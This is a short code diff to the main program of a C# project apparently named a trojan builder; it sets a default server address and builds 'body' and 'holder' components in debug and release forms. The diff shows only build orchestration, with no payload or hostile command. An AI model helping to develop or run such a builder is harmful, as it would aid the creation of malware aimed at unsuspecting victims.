@@ -1,4 +1,6 @@
-﻿namespace TroyanBuilder;
+﻿using model;
+
+namespace TroyanBuilder;
 
 public class Program
 {
@@ -32,13 +34,14 @@ public class Program
 
     static void Main(string[] args)
     {
+        Dev.DefaultServer(args.Length > 0 ? args[0] : Dev.Mode);
         Clean();
         var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
         //var arr = new CustomBuilder[] { new BodyBuilderRelease() };
         foreach (var cb in arr)
         {
             Console.WriteLine(cb);
-            var result = cb.Build(args.Length > 0 ? args[0] : "127.0.0.1");
+            var result = cb.Build(args.Length > 0 ? args[0] : Dev.Mode);
             foreach (var line in result)
             {
                 Console.WriteLine(line);    
